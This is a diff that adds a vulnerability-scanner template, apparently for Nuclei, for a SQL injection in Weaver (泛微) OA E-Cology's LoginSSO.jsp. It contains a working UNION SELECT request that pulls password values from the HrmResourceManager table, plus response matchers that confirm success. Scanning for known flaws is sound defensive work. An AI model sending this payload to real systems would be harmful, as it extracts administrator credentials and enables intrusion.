@@ -1,0 +1,33 @@
+id: fanweiOA-E-Cology-LoginSSO_jsp-sql-injection
+
+info:
+  name: 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞
+  author: cnaq
+  severity: high  
+  description: 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20LoginSSO.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-33202.html
+  tags: oa,fanwei,ecology,sql
+
+
+requests:
+  - raw:
+      - |
+        GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Login.jsp"
+        part: body
+        negative: true
+
+      - type: dsl
+        dsl:
+          - 'len(body)>=32&&len(body)<=1024'
